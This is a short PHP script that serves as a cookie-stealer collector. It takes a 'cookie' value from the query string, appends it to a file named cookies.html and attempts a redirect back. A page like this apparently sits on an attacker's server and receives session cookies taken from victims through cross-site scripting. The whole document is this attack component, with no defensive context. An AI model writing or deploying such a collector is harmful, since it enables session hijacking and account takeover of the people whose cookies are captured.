     <?php
    $cookie = $_GET['cookie'];
    $fp = fopen('cookies.html', 'a');
    fwrite($fp, 'Cookie: '.$cookie);
    fclose($fp);
    header ("javascript:history.back()");
    ?>